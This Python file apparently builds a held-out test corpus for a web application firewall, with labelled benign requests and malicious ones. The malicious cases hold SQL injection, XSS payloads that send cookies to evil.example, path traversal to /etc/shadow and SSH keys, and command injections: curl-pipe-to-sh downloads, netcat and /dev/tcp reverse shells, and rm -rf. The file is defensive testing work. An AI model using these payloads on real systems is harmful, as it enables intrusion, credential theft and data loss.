"""
evaluation_corpus_extended.py
=============================
Expanded evaluation corpus for evaluate_waf.py.

The original 29 labelled cases (12 benign + 17 malicious) stay untouched in
evaluate_waf.py. This module adds 171 more cases (88 benign + 83 malicious)
so the labelled corpus reaches 200 cases: 100 benign + 100 malicious, with
25 cases per attack class.

Format
------
Every case is created through the SAME `req()` factory used by the original
cases (passed in as an argument to avoid a circular import), so the schema
is identical:  case_id, label, request (WAFRequest), family, variant.
The only addition is a `split` tag: the original cases are "dev",
everything in this file is "heldout" (see evaluation/CORPUS.md).

Labelling rules
---------------
* The label is decided by the INTENT of the request, never by what the WAF
  does with it. No label was changed after seeing results.
* Payloads follow publicly documented attack techniques (OWASP / PortSwigger
  style cheat-sheets). They were NOT crafted to dodge or to satisfy specific
  regexes, so some are expected to be missed (false negatives).
* Only injection points the WAF actually inspects are used: query values,
  form values, JSON-body values (with Content-Type: application/json),
  cookie values, header values, and (path traversal only) the request path.
  Parameter *names* and raw non-JSON bodies are not inspected by any
  detector, so no case relies on them.
* Benign cases whose variant starts with "hard-negative" are legitimate
  requests that deliberately contain attack-like words or characters.

Payloads here are inert strings sent to the WAF as data; nothing is executed.
"""

from __future__ import annotations

import json
from typing import Callable, List

SPLIT = "heldout"

# Deterministic, collision-free source IPs (the bot detector counts requests
# per IP, so every case gets its own address).
_IP_BLOCK = {"SQL": 1, "XSS": 2, "PATH": 3, "CMD": 4, "B": 5}


def _remote_addr(case_id: str) -> str:
    prefix = case_id.rstrip("0123456789")
    number = int(case_id[len(prefix):])
    return f"10.251.{_IP_BLOCK[prefix]}.{number}"


JSON_CT = {"Content-Type": "application/json"}


def build_extended_malicious_cases(req: Callable) -> list:
    cases: List = []

    def add(case_id, label, family, variant, **kw):
        cases.append(
            req(case_id, label, family=family, variant=variant,
                remote_addr=_remote_addr(case_id), split=SPLIT, **kw)
        )

    # ------------------------------------------------------------------
    # SQL injection (20 new; SQL01-SQL05 are the original cases)
    # ------------------------------------------------------------------
    def sqli(i, variant, **kw):
        add(f"SQL{i:02d}", "sql_injection", "sqli", variant, **kw)

    sqli(6, "comment-auth-bypass", path="/login", method="POST",
         form_data={"username": "admin'--", "password": "x"})
    sqli(7, "or-1=1-comment-auth-bypass", path="/login", method="POST",
         form_data={"username": "' OR 1=1-- ", "password": "anything"})
    sqli(8, "json-body-auth-bypass", path="/api/login", method="POST",
         headers=JSON_CT,
         body=json.dumps({"username": "admin", "password": "' OR '1'='1' -- "}))
    sqli(9, "union-all-null-probe", path="/products",
         query_params={"category": "Gifts' UNION ALL SELECT NULL,NULL,NULL--"})
    sqli(10, "union-information-schema", path="/products",
         query_params={"id": "-1 UNION SELECT table_name,NULL FROM information_schema.tables--"})
    sqli(11, "error-based-extractvalue", path="/item",
         query_params={"id": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))"})
    sqli(12, "error-based-convert-mssql", path="/item",
         query_params={"id": "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))"})
    sqli(13, "time-based-mysql-sleep", path="/search",
         query_params={"q": "1' AND SLEEP(5)-- "})
    sqli(14, "time-based-postgres-pg-sleep", path="/item",
         query_params={"id": "1; SELECT pg_sleep(10)--"})
    sqli(15, "time-based-mssql-waitfor", path="/item",
         query_params={"id": "1; WAITFOR DELAY '0:0:5'--"})
    sqli(16, "boolean-blind-subquery-count", path="/item",
         query_params={"id": "1 AND (SELECT COUNT(*) FROM users)>0"})
    sqli(17, "boolean-blind-substring", path="/item",
         query_params={"id": "1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--"})
    sqli(18, "url-encoded-tautology", path="/search",
         query_params={"q": "%27%20OR%20%271%27%3D%271"})
    sqli(19, "mixed-case-union-select", path="/search",
         query_params={"q": "1 uNiOn SeLeCt username,password fRoM users"})
    sqli(20, "comment-split-keywords", path="/products",
         query_params={"id": "1 UN/**/ION SEL/**/ECT 1,2,3"})
    sqli(21, "mysql-versioned-comment", path="/products",
         query_params={"id": "1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3"})
    sqli(22, "stacked-insert", path="/item",
         query_params={"id": "1; INSERT INTO users(username,password) VALUES('hacker','pwned')--"})
    sqli(23, "stacked-update-post-body", path="/profile", method="POST",
         form_data={"bio": "x'; UPDATE users SET role='admin' WHERE username='bob'--"})
    sqli(24, "header-x-forwarded-for", path="/",
         headers={"X-Forwarded-For": "127.0.0.1' OR 1=1--"})
    sqli(25, "cookie-union-select", path="/dashboard",
         cookies={"TrackingId": "xyz' UNION SELECT password FROM users--"})

    # ------------------------------------------------------------------
    # Cross-site scripting (20 new; XSS01-XSS05 are the original cases)
    # ------------------------------------------------------------------
    def xss(i, variant, **kw):
        add(f"XSS{i:02d}", "xss", "xss", variant, **kw)

    xss(6, "mixed-case-script-tag", path="/search",
        query_params={"q": "<ScRiPt>alert(document.domain)</ScRiPt>"})
    xss(7, "svg-onload", path="/search",
        query_params={"q": "<svg onload=alert(1)>"})
    xss(8, "svg-animate-onbegin", path="/comment", method="POST",
        form_data={"body": "<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>"})
    xss(9, "body-onload", path="/comment", method="POST",
        form_data={"body": "<body onload=alert('XSS')>"})
    xss(10, "anchor-javascript-uri", path="/comment", method="POST",
        form_data={"body": '<a href="javascript:alert(document.cookie)">Click me</a>'})
    xss(11, "numeric-entity-encoded-javascript-uri", path="/comment", method="POST",
        form_data={"body": '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>'})
    xss(12, "url-encoded-img-onerror", path="/search",
        query_params={"q": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"})
    xss(13, "double-url-encoded-svg-onload", path="/search",
        query_params={"q": "%253Csvg%2520onload%253Dalert(1)%253E"})
    xss(14, "attribute-breakout-onmouseover", path="/search",
        query_params={"q": '"><img src=x onmouseover=alert(1)>'})
    xss(15, "autofocus-onfocus", path="/comment", method="POST",
        form_data={"body": "<input autofocus onfocus=alert(1)>"})
    xss(16, "details-ontoggle", path="/comment", method="POST",
        form_data={"body": "<details open ontoggle=alert(1)>"})
    xss(17, "nested-script-filter-bypass", path="/search",
        query_params={"q": "<scr<script>ipt>alert(1)</scr</script>ipt>"})
    xss(18, "malformed-unclosed-img-onerror", path="/comment", method="POST",
        form_data={"body": '<img src="x" onerror="alert(1)'})
    xss(19, "json-body-cookie-exfiltration", path="/api/comments", method="POST",
        headers=JSON_CT,
        body=json.dumps({"post_id": 5,
                         "body": "<script>fetch('//evil.example/c?'+document.cookie)</script>"}))
    xss(20, "dom-document-write-cookie", path="/search",
        query_params={"q": "';document.write('<img src=//evil.example/x.gif?c='+document.cookie+'>');//"})
    xss(21, "dom-innerhtml-sink", path="/search",
        query_params={"q": "\"><img src=x onerror=\"document.getElementById('out').innerHTML='pwned'\">"})
    xss(22, "header-x-forwarded-host", path="/",
        headers={"X-Forwarded-Host": 'evil.example"><script>alert(1)</script>'})
    xss(23, "cookie-svg-onload", path="/profile",
        cookies={"lang": 'en"><svg onload=alert(1)>'})
    xss(24, "hex-entity-encoded-script", path="/comment", method="POST",
        form_data={"body": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"})
    xss(25, "object-data-uri-base64", path="/search",
        query_params={"q": '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'})

    # ------------------------------------------------------------------
    # Path traversal (22 new; PATH01-PATH03 are the original cases)
    # ------------------------------------------------------------------
    def path_case(i, variant, **kw):
        add(f"PATH{i:02d}", "path_traversal", "path", variant, **kw)

    path_case(4, "backslash-windows-hosts", path="/download",
              query_params={"file": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"})
    path_case(5, "nested-sequence-filter-bypass", path="/download",
              query_params={"file": "....//....//....//etc/passwd"})
    path_case(6, "absolute-etc-passwd", path="/download",
              query_params={"file": "/etc/passwd"})
    path_case(7, "absolute-etc-shadow", path="/download",
              query_params={"file": "/etc/shadow"})
    path_case(8, "absolute-windows-sam", path="/download",
              query_params={"file": "C:\\Windows\\System32\\config\\SAM"})
    path_case(9, "absolute-boot-ini", path="/download",
              query_params={"file": "C:\\boot.ini"})
    path_case(10, "proc-self-environ", path="/download",
              query_params={"file": "/proc/self/environ"})
    path_case(11, "deep-multiple-sequences", path="/download",
              query_params={"file": "../" * 8 + "etc/hosts"})
    path_case(12, "fully-url-encoded-dots-and-slashes", path="/download",
              query_params={"file": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"})
    path_case(13, "double-encoded-backslash-win-ini", path="/download",
              query_params={"file": "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini"})
    path_case(14, "mixed-slash-backslash", path="/download",
              query_params={"file": "..\\../..\\../etc/passwd"})
    path_case(15, "utf8-overlong-slash", path="/download",
              query_params={"file": "..%c0%af..%c0%afetc%c0%afpasswd"})
    path_case(16, "null-byte-extension-bypass", path="/download",
              query_params={"file": "../../etc/passwd%00.png"})
    path_case(17, "request-path-traversal", path="/static/../../etc/passwd")
    path_case(18, "request-path-encoded-traversal", path="/files/..%2f..%2f..%2fetc%2fpasswd")
    path_case(19, "post-body-template-traversal", path="/render", method="POST",
              form_data={"template": "../../../../var/www/html/config.php"})
    path_case(20, "json-body-backslash-traversal", path="/api/files", method="POST",
              headers=JSON_CT,
              body=json.dumps({"path": "..\\..\\..\\windows\\win.ini"}))
    path_case(21, "cookie-traversal", path="/profile",
              cookies={"lang": "../../../../etc/passwd"})
    path_case(22, "header-x-original-url", path="/",
              headers={"X-Original-URL": "/../../../etc/passwd"})
    path_case(23, "absolute-var-log", path="/download",
              query_params={"file": "/var/log/auth.log"})
    path_case(24, "ssh-private-key", path="/download",
              query_params={"file": "../../../../home/deploy/.ssh/id_rsa"})
    path_case(25, "file-uri-scheme", path="/download",
              query_params={"file": "file:///etc/passwd"})

    # ------------------------------------------------------------------
    # Command injection (21 new; CMD01-CMD04 are the original cases)
    # ------------------------------------------------------------------
    def cmd(i, variant, **kw):
        add(f"CMD{i:02d}", "command_injection", "command", variant, **kw)

    cmd(5, "semicolon-ls", path="/ping",
        query_params={"host": "127.0.0.1; ls -la"})
    cmd(6, "single-pipe-whoami", path="/ping",
        query_params={"host": "127.0.0.1 | whoami"})
    cmd(7, "or-operator-cat", path="/ping",
        query_params={"host": "127.0.0.1 || cat /etc/passwd"})
    cmd(8, "and-operator-download-and-run", path="/ping",
        query_params={"host": "example.com && wget http://evil.example/s.sh -O /tmp/s.sh && sh /tmp/s.sh"})
    cmd(9, "backtick-substitution", path="/ping",
        query_params={"host": "`whoami`.example.com"})
    cmd(10, "dollar-paren-curl-pipe-sh", path="/ping",
        query_params={"host": "$(curl http://evil.example/x|sh)"})
    cmd(11, "netcat-reverse-shell", path="/ping",
        query_params={"host": "127.0.0.1;nc -e /bin/sh 10.0.0.5 4444"})
    cmd(12, "bash-dev-tcp-reverse-shell", path="/ping",
        query_params={"host": "; bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"})
    cmd(13, "ampersand-ping-oob", path="/ping",
        query_params={"host": "127.0.0.1 & ping -c 4 10.0.0.5 &"})
    cmd(14, "semicolon-sleep-time-based", path="/ping",
        query_params={"host": "127.0.0.1; sleep 10"})
    cmd(15, "encoded-newline-whoami", path="/ping",
        query_params={"host": "8.8.8.8%0Awhoami"})
    cmd(16, "windows-ampersand-dir-net-user", path="/ping",
        query_params={"host": "127.0.0.1 & dir c:\\ & net user"})
    cmd(17, "windows-cmd-exe", path="/ping",
        query_params={"host": "cmd.exe /c whoami"})
    cmd(18, "post-body-semicolon-cat-shadow", path="/diagnostics", method="POST",
        form_data={"host": "localhost; cat /etc/shadow"})
    cmd(19, "json-body-rm-rf", path="/api/diagnostics", method="POST",
        headers=JSON_CT,
        body=json.dumps({"hostname": "8.8.8.8; rm -rf /tmp/uploads"}))
    cmd(20, "url-encoded-semicolon-cat", path="/ping",
        query_params={"host": "%3Bcat%20%2Fetc%2Fpasswd"})
    cmd(21, "ifs-whitespace-obfuscation", path="/ping",
        query_params={"host": ";cat${IFS}/etc/passwd"})
    cmd(22, "header-shellshock-user-agent", path="/cgi-bin/status",
        headers={"User-Agent": '() { :;}; /bin/bash -c "cat /etc/passwd"'})
    cmd(23, "header-x-forwarded-for-curl-pipe-sh", path="/",
        headers={"X-Forwarded-For": "127.0.0.1; curl http://evil.example/p | sh"})
    cmd(24, "cookie-backtick-curl", path="/dashboard",
        cookies={"prefs": "`curl evil.example/x|sh`"})
    cmd(25, "interpreter-os-system", path="/export",
        query_params={"file": "report.pdf; python3 -c 'import os;os.system(\"id\")'"})

    return cases


def build_extended_benign_cases(req: Callable) -> list:
    cases: List = []
    counter = [12]  # B01-B12 are the original benign cases

    def add(variant, **kw):
        counter[0] += 1
        case_id = f"B{counter[0]:02d}"
        cases.append(
            req(case_id, "benign", family="benign", variant=variant,
                remote_addr=_remote_addr(case_id), split=SPLIT, **kw)
        )

    # --- Ordinary navigation and URL shapes -------------------------------
    add("get-blog-slug", path="/blog/2026/10/getting-started-with-django")
    add("get-category-filters", path="/products",
        query_params={"category": "shoes", "brand": "nike", "size": "10", "color": "black"})
    add("get-pagination-and-sort", path="/products",
        query_params={"page": "3", "per_page": "24", "sort": "price_desc"})
    add("path-encoded-plus-signs", path="/tags/c%2B%2B")
    add("get-encoded-utf8-query", path="/search",
        query_params={"q": "caf%C3%A9+au+lait"})
    add("path-with-apostrophe", path="/user/o'brien/profile")

    # --- Static resources --------------------------------------------------
    add("static-css-with-version", path="/static/css/base.css",
        query_params={"v": "1.4.2"}, headers={"Accept": "text/css,*/*;q=0.1"})
    add("static-js-bundle", path="/static/js/app.min.js")
    add("favicon-conditional-get", path="/favicon.ico",
        headers={"If-None-Match": 'W/"33a64df551425fcc55e4d42a148795d9f25f89d4"'})

    # --- Search queries ----------------------------------------------------
    add("search-apostrophe", path="/search", query_params={"q": "Tom's Hardware review"})
    add("search-quoted-phrase", path="/search",
        query_params={"q": '"exact phrase search" site tutorials'})
    add("search-comparison-operators", path="/search",
        query_params={"q": "laptop price < 500 and rating > 4"})
    add("search-brackets-and-plus", path="/search",
        query_params={"q": "C++ (programming) [beginner] {tips}"})
    add("search-sql-keyword-select", path="/search",
        query_params={"q": "select the best laptop for students"})
    add("search-sql-keyword-update", path="/search",
        query_params={"q": "how to update a user profile in Django"})
    add("search-hindi", path="/search", query_params={"q": "नमस्ते दुनिया ब्लॉग"})
    add("search-japanese", path="/search", query_params={"q": "日本語 ブログ 検索"})
    add("search-arabic", path="/search", query_params={"q": "مرحبا بالعالم"})
    add("search-cyrillic", path="/search", query_params={"q": "Привет, мир! Как дела?"})
    add("search-emoji", path="/search", query_params={"q": "🎉 birthday party ideas 🎂"})

    # --- Hard negatives: SQL-looking words in legitimate text ----------------
    add("hard-negative-sql-words-union-selected", path="/comment", method="POST",
        form_data={"body": "The labour union selected a new president last week."})
    add("hard-negative-sql-words-delete-from", path="/comment", method="POST",
        form_data={"body": "Please delete from my wishlist the items I already bought."})
    add("hard-negative-sql-words-insert-into", path="/comment", method="POST",
        form_data={"body": "The tutorial says to insert into the database only validated rows."})
    add("hard-negative-sql-words-information-schema", path="/search",
        query_params={"q": "how does information_schema work in MySQL"})
    add("hard-negative-sql-words-drop-table", path="/comment", method="POST",
        form_data={"body": "Please drop table decorations at the venue by 5pm."})
    add("hard-negative-sql-words-sleep-call", path="/comment", method="POST",
        form_data={"body": "The function sleep(5) pauses a Python script for five seconds."})
    add("hard-negative-sql-words-select-star", path="/search",
        query_params={"q": "SELECT * FROM tutorial for beginners"})
    add("hard-negative-double-dash-and-hash", path="/comment", method="POST",
        form_data={"body": "Great post -- really enjoyed the part about indexes #databases"})

    # --- Hard negatives: shell-looking words in legitimate text --------------
    add("hard-negative-shell-words-powershell", path="/search",
        query_params={"q": "learn powershell scripting basics"})
    add("hard-negative-shell-words-whoami", path="/search",
        query_params={"q": "whoami command explained"})
    add("hard-negative-shell-words-netcat", path="/search",
        query_params={"q": "install netcat nc on ubuntu"})
    add("hard-negative-shell-chaining-text", path="/comment", method="POST",
        form_data={"body": "Use && to chain commands in a bash script."})
    add("hard-negative-markdown-backticks", path="/comment", method="POST",
        form_data={"body": "Run `npm install` and then `npm start` to launch the app."})
    add("hard-negative-jquery-dollar-paren", path="/comment", method="POST",
        form_data={"body": "In jQuery you can write $(document).ready() to wait for the DOM."})
    add("hard-negative-shell-words-wget-curl", path="/search",
        query_params={"q": "wget vs curl which is better"})
    add("hard-negative-shell-words-sleep-hours", path="/search",
        query_params={"q": "does sleep 8 hours really matter"})
    add("hard-negative-shell-words-cat-ping", path="/search",
        query_params={"q": "cat adoption and ping pong clubs"})
    add("hard-negative-path-word-etc-passwd", path="/search",
        query_params={"q": "what does /etc/passwd contain"})

    # --- Normal HTML content -------------------------------------------------
    add("html-bold-paragraph", path="/comment", method="POST",
        form_data={"body": "<p>Hello <strong>world</strong>, welcome!</p>"})
    add("html-anchor-with-query", path="/comment", method="POST",
        form_data={"body": '<a href="https://example.com/post/42?ref=home">Read more</a>'})
    add("html-image-tag", path="/comment", method="POST",
        form_data={"body": '<img src="/media/uploads/cat.png" alt="A cat">'})
    add("html-blockquote-quotes", path="/comment", method="POST",
        form_data={"body": '<blockquote>"To be, or not to be"</blockquote><br/>'})
    add("hard-negative-html-inline-svg-icon", path="/post/new", method="POST",
        form_data={"content": '<svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/></svg>'})
    add("hard-negative-html-script-element-discussion", path="/comment", method="POST",
        form_data={"body": "Remember that the <script> element must be closed with </script>."})
    add("html-table-with-apostrophe", path="/comment", method="POST",
        form_data={"body": "<table><tr><th>Name</th><td>O'Brien</td></tr></table>"})
    add("text-math-comparison", path="/comment", method="POST",
        form_data={"body": "If a < b and c > d then the result is positive."})

    # --- JSON request bodies / API ------------------------------------------
    add("json-create-order", path="/api/orders", method="POST", headers=JSON_CT,
        body=json.dumps({"items": [{"sku": "A-100", "qty": 2}, {"sku": "B-205", "qty": 1}],
                         "coupon": "SAVE10",
                         "shipping": {"city": "Kolkata", "zip": "700001"}}))
    add("json-patch-profile-unicode-apostrophe", path="/api/users/42", method="PATCH",
        headers=JSON_CT,
        body=json.dumps({"display_name": "Zoë O'Connor",
                         "bio": "Coffee, code & cats — in that order."}, ensure_ascii=False))
    add("json-login", path="/api/login", method="POST", headers=JSON_CT,
        body=json.dumps({"email": "user@example.com", "password": "S3cure!Pass#2026"}))
    add("json-graphql-query", path="/graphql", method="POST", headers=JSON_CT,
        body=json.dumps({"query": "query { user(id: 1) { name email posts { title } } }"}))
    add("json-nested-search-filters", path="/api/search", method="POST", headers=JSON_CT,
        body=json.dumps({"filters": {"price": {"gte": 10, "lte": 99}, "tags": ["a", "b"]},
                         "sort": [{"field": "created_at", "order": "desc"}]}))
    add("json-comment-mentions-sql-joins", path="/api/comments", method="POST", headers=JSON_CT,
        body=json.dumps({"post_id": 17,
                         "body": "Loved the article! Could you cover SQL joins next? I'm confused about LEFT vs INNER."}))
    add("json-feedback-ampersand", path="/api/feedback", method="POST", headers=JSON_CT,
        body=json.dumps({"rating": 5, "comment": "Fast delivery & great packaging. Will order again!"}))
    add("json-bengali-text", path="/api/profile", method="POST", headers=JSON_CT,
        body=json.dumps({"name": "রাহুল সেন", "city": "কলকাতা"}, ensure_ascii=False))
    add("hard-negative-json-update-set-wording", path="/api/tickets", method="POST", headers=JSON_CT,
        body=json.dumps({"subject": "Profile visibility",
                         "message": "Please update profile set to private for my account."}))

    # --- Forms, login and registration --------------------------------------
    add("form-register-special-char-password", path="/register", method="POST",
        form_data={"username": "alice_w", "email": "alice@example.com",
                   "password": "Tr0ub4dor&3", "confirm_password": "Tr0ub4dor&3"})
    add("form-register-hyphenated-name-plus-email", path="/register", method="POST",
        form_data={"name": "Anne-Marie O'Neil", "email": "anne.marie+blog@example.co.uk",
                   "password": "correct--horse--battery"})
    add("form-login-quotes-in-password", path="/login", method="POST",
        form_data={"username": "bob", "password": "p@ss'word\"123"})
    add("form-contact-long-message", path="/contact", method="POST",
        form_data={"name": "Priya Sharma", "email": "priya@example.in",
                   "message": ("Hello team, I ordered a pair of shoes last week (order #48213) and "
                               "they arrived in the wrong size. I'd like to exchange them for a "
                               "size 8 - could you tell me how that works? Also, is the 10% "
                               "discount code still valid for the replacement? Thanks! ") * 3})
    add("form-checkout-address-and-phone", path="/checkout", method="POST",
        form_data={"address": "221B Baker St., Apt #4", "city": "London", "zip": "NW1 6XE",
                   "phone": "+44 20 7946 0958", "notes": "Leave with the neighbour (No. 5), please."})
    add("form-profile-quotes-brackets-braces", path="/profile/edit", method="POST",
        form_data={"bio": "I love 'single quotes' and \"double quotes\", [brackets], (parentheses) and {braces}."})
    add("form-new-post-markdown-list", path="/post/new", method="POST",
        form_data={"title": "Top 10 tips: SQL, Python & more!",
                   "content": "Here are my tips:\n- Index your columns\n- Use `EXPLAIN`\n- Don't repeat yourself"})
    add("multipart-avatar-upload", path="/upload", method="POST",
        form_data={"caption": "My new profile picture"},
        files={"avatar": {"name": "photo.jpg", "content_type": "image/jpeg"}})
    add("multipart-pdf-upload", path="/upload", method="POST",
        form_data={"title": "Quarterly report"},
        files={"document": {"name": "report-2026-q3.pdf", "content_type": "application/pdf"}})

    # --- Cookies -------------------------------------------------------------
    add("cookies-session-and-csrf", path="/dashboard",
        cookies={"csrftoken": "kP2xV9mQ7zL4nR8tB3wY6cH1jF5dG0sA", "sessionid": "9f8a7b6c5d4e3f2a1b0c"})
    add("cookies-analytics", path="/",
        cookies={"_ga": "GA1.2.1234567890.1700000000", "_gid": "GA1.2.987654321.1700000000"})
    add("cookie-base64-preferences", path="/",
        cookies={"prefs": "eyJ0aGVtZSI6ImRhcmsiLCJsYW5nIjoiZW4ifQ=="})
    add("hard-negative-cookie-name-role", path="/dashboard", cookies={"role": "reader"})
    add("cookie-pipe-and-colon-cart", path="/cart", cookies={"cart": "3:2|7:1|12:5"})

    # --- Headers, methods and API clients -----------------------------------
    add("header-bearer-jwt", path="/api/me",
        headers={"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                 "Accept": "application/json, text/plain, */*"})
    add("header-accept-language-and-encoding", path="/",
        headers={"Accept-Language": "en-US,en;q=0.9,bn;q=0.8", "Accept-Encoding": "gzip, deflate, br",
                 "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1"})
    add("header-google-referer-with-query", path="/blog/waf-testing",
        headers={"Referer": "https://www.google.com/search?q=waf+evaluation&oq=waf&aqs=chrome..69i57j0l5.1234j0j7&sourceid=chrome&ie=UTF-8"})
    add("header-multipart-content-type-boundary", path="/upload", method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"},
        form_data={"title": "Holiday photos"})
    add("header-xff-proxy-chain", path="/",
        headers={"X-Forwarded-For": "203.0.113.7, 70.41.3.18, 150.172.238.178"})
    add("header-basic-auth-and-xhr", path="/api/status",
        headers={"Authorization": "Basic dXNlcjpwYXNz", "X-Requested-With": "XMLHttpRequest"})
    add("method-options-cors-preflight", path="/api/items", method="OPTIONS",
        headers={"Origin": "https://app.example.com", "Access-Control-Request-Method": "POST",
                 "Access-Control-Request-Headers": "content-type,authorization"})
    add("method-head", path="/", method="HEAD")
    add("method-delete-resource", path="/api/items/42", method="DELETE")
    add("api-get-with-field-list", path="/api/v1/products",
        query_params={"fields": "id,name,price", "page": "2", "sort": "-created_at"})
    add("api-client-curl-user-agent", path="/api/health", headers={"User-Agent": "curl/8.5.0"})
    add("api-client-python-requests-user-agent", path="/api/v1/products",
        headers={"User-Agent": "python-requests/2.31.0", "Accept": "application/json"},
        query_params={"page": "1"})
    add("crawler-googlebot-user-agent", path="/blog",
        headers={"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"})

    # --- Legitimate file paths / encoded params / long query strings ---------
    add("download-nested-relative-path", path="/download",
        query_params={"file": "reports/2026/q3/summary.pdf"})
    add("download-filename-with-space-and-parens", path="/download",
        query_params={"file": "images/2026/10/sunset (1).png"})
    add("encoded-redirect-url", path="/login",
        query_params={"next": "https%3A%2F%2Fexample.com%2Fcallback%3Fcode%3Dabc%26state%3Dxyz"})
    add("encoded-percent-sign-and-hex-colour", path="/products",
        query_params={"promo": "50%25+off", "colour": "%23ff00aa"})
    add("long-filter-query-string", path="/products",
        query_params={**{f"attr{i}": f"value{i}" for i in range(1, 41)},
                      "category": "electronics", "sort": "price_asc", "page": "1"})
    add("hard-negative-hex-literal-order-reference", path="/orders/lookup",
        query_params={"ref": "0xDEADBEEF-2026-INV"})

    return cases


# ----------------------------------------------------------------------
# Self-check (run:  python evaluation_corpus_extended.py)
# Uses a stub factory, so it needs neither evaluate_waf.py nor the WAF.
# ----------------------------------------------------------------------
def _self_check() -> None:
    from collections import Counter

    def stub(case_id, label, **kw):
        return {"case_id": case_id, "label": label, **kw}

    mal = build_extended_malicious_cases(stub)
    ben = build_extended_benign_cases(stub)
    allc = mal + ben

    ids = [c["case_id"] for c in allc]
    assert len(ids) == len(set(ids)), "duplicate case ids"

    def sig(c):
        return json.dumps(
            {k: c.get(k) for k in ("path", "method", "query_params", "form_data",
                                   "headers", "cookies", "body", "files")},
            sort_keys=True, default=str)
    sigs = [sig(c) for c in allc]
    assert len(sigs) == len(set(sigs)), "duplicate requests"

    fam = Counter(c["family"] for c in mal)
    assert len(mal) == 83 and len(ben) == 88, (len(mal), len(ben))
    # originals: sqli 5, xss 5, path 3, command 4 (+12 benign) -> 25 each, 100 benign
    assert {k: v + o for (k, v), o in zip(sorted(fam.items()), (4, 3, 5, 5))} == \
        {"command": 25, "path": 25, "sqli": 25, "xss": 25}, fam
    assert len(ben) + 12 == 100 and len(mal) + 17 == 100
    print(f"OK: {len(allc)} extended cases ({len(mal)} malicious, {len(ben)} benign); "
          f"with the 29 originals: 100 malicious + 100 benign = 200; per class: "
          f"{dict(sorted(fam.items()))} new + originals = 25 each")


if __name__ == "__main__":
    _self_check()
